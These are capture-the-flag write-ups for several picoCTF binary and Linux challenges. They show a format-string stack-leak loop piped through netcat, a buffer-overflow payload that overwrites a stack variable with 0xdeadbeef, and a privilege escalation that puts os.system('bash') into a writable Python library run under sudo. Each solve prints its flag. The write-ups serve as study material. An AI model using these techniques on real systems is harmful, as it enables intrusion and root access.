buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

We know it's a buffer overflow, so typing long enough strings _should_ work.
And it does ! but why ?

All you really need to look at is here:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

The `sigsegv_handler` function is called when a segmentation fault occurs. A bit of googling reveals that
it the ``strcpy`` can cause the sigsev (writing outta bounds). So we just input a string b/w (16,100) and make it overflow.

# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}`

Didn't even download the binary - reading the title, you can assume that
they _will_ be having raw printfs() without format strings. Choose the options that have a fstring embedded within them
and you get the flag. The segfault is due to trying to parse non string bytes as bytes, of course.

# Flag leak

**Flag:** `picCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

again, easily assume it is an fstrings issue, again.

After verifing with %s, I started smashing %s in hopes that I could leak the stack directly.
This obviously didn't work

After some talking with chatgpt, I learned about stack offsets and cooked up a small script myself to attack the stack -
```zsh
for i in {1..29}; do echo %"$i"\$s | nc saturn.picoctf.net 53300
done
```
which gave me
```
Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
```

missed the pico part as it probably wasn't properly aligned. What do you do if part of the flag was stuck there ?

No real clue, but $i%x is probably the way, if I had to guess.

# two-sum

**Flag:** `picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4}`

Another cheesy challenge really, but here you go -
The chall asks for n1 > n1 + n2 - obviously n1 must overflow.
Find out that a c int uses 4 bytes and calculate approximate overflow values -
2147483647 2

and type it in and get the flag

# clutter-overflow

**Flag:** `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`

So we have access to a server via netcat:

```
> nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|

| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
```

We _do_ have acess to the source code, but we will be doing it blind here.

(At least I did it blind :P - do whatever you wish)

lets try some random input:
```
...
What do you see?
pizzas ?
code == 0x0
code != 0xdeadbeef :(
```

Not pizzas, it seems. Sad.

Anyways, looking at the `code` that it talks about, it's probbaly a value on the stack. Lets find out how much we need to
jump manually via some binary search.

`0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef1111`
is that magic string for us. anything over that modifies the `code` int. write it into a file, say called eep.

Now to reproduce the 0xdeadbeef string. Commonly used as a magic value, this should be easy right ?

Well, nope. The main gotcha comes in the fact that while uints on a device is generally in lil endian, and strings are not.
So just pulling up your favorite hex editor and screaming `DEADBEEF` will not do the trick. What you can do is either manually
covert it into `EFBEADDE`, it's compliment or do a quick c sinppet:

```c
#include <stdio.h>

int main() {
	unsigned int value = 0xDEADBEEF;

	// Cast the integer to a char pointer to access da bytes
	unsigned char *bytes = (unsigned char *)&value;

	for (int i = 0; i < sizeof(value); i++) {
		printf("%c", bytes[i]);
	}
}
```

which gives you the same thing. The output is `ﾭ�` if you are curious. Write that to a file, say weep.

Now we do -
```zsh
(cat ./eep; cat ./weep; echo "" ) | nc mars.picoctf.net 31890
```

and get a beautiful -
```
...
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

This one is easy to make mistakes on, took me a few hours really. Has a lil less than 4k solves.

# hijacking

**Flag:** `picoCTF{picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`

We have a server with ssh access. yay !

`kitten ssh picoctf@saturn.picoctf.net -p 64142`

Hm, snoop around for a bit and it seems like a very standard ubuntu setup. With the lack of stuff like curl and ping though.
Before going nuclear with linpeas or so, the desciption talks about a python server file, which `ls -lah` promptly reveals.
The file is owned by root too.

Now we have a look at it -
```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

Weird stuff. dosent look like what it actually does is anything relavant though.
Well, it's owned by root. Can we execute it as root ?

```sh
picoctf@challenge:~$ sudo python3 ~/.server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

(You can either guesswork the exact string that sudo's filters allow, or use sudo -l btw). Anyways. I see a distict
lack of a ping command. PATH manipulation ?

```sh
....(after some work)
picoctf@challenge:~$ sudo -E python3 ~/.server.py
sudo: sorry, you are not allowed to preserve the environment
```

Oh well. so we have to directly attack the modules. snoop around `/usr/lib/python3.8` and we find a r/w accessable base64.py.
Add some commands -

```py
import os
print('Hello World!')
os.system('whoami')
os.system('bash')
...
```

now snoop around a bit and find the file at /root/.flag.txt !
